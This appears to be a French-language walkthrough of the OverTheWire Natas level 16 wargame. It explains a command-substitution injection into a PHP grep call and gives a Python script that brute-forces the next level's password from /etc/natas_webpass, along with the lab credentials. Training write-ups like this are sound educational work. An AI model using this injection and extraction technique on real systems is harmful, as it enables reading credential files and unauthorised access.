## Connexion (username=natas16 password=Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb)
```
http://natas16.natas.labs.overthewire.org/
```

## Recherche du mot de passe
Les caractères suivants sont filtré:
```[;|&`\'"]```

Encore une fois ```^``` n'est pas filtré.

Le problème est différent:
```php
passthru("grep -i \"$key\" dictionary.txt");
```
ce qui revient à la commande terminale: ```grep -i "mon input" dictionnary.txt```

Puis si on cherche à mettre un input:
--file=/etc/natas_webpass/natas17

Rien n'est affiché.

Autre chose intéressante si j'entre $USER je vois des mots du dictionnaire qui contiennent root vu qu'il est run en tant que root ...

Or en mettant ```$(grep ^builded_pwd /etc/natas_webpass/natas17)apple``` comme input, c'est comme afficher si le mot de passe commence par builded_pwd (que je bâtirai dynamiquement en fonction du feedback) retourne le puis concatene apple (ca donne un mot inexistant donc rien ne sera trouvé dans dictionnary.txt), sinon le $(grep ...) est vide donc il restera apple seulement, et ainsi les mots dans dictionnary.txt qui ont un substring apple seront retournés.
```python
import string
import requests

url = "http://natas16.natas.labs.overthewire.org/index.php"
header = {
    "Authorization": "Basic bmF0YXMxNjpYbTZYRWVSTjN6c0dqUkRxQlBtdXFBVlY2NWs3ZTNHYg=="
}
ALPHABET = string.ascii_letters + string.digits
builded_pwd = ""
while(len(builded_pwd) < 32):
    for letter in ALPHABET:
        response = requests.get(
            url + f'?needle=$(grep ^{builded_pwd+letter} /etc/natas_webpass/natas17)apple',
            headers=header
        )
        if not 'apple' in response.text:
            builded_pwd += letter
            print(builded_pwd)
print(f"The password for natas 17 is : {builded_pwd}")
```

** Note: le script est un peu long, on aurait facilement pu réduire le domaine de l'alphabet au préalable
## Prochain mot de passe
```
KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx
```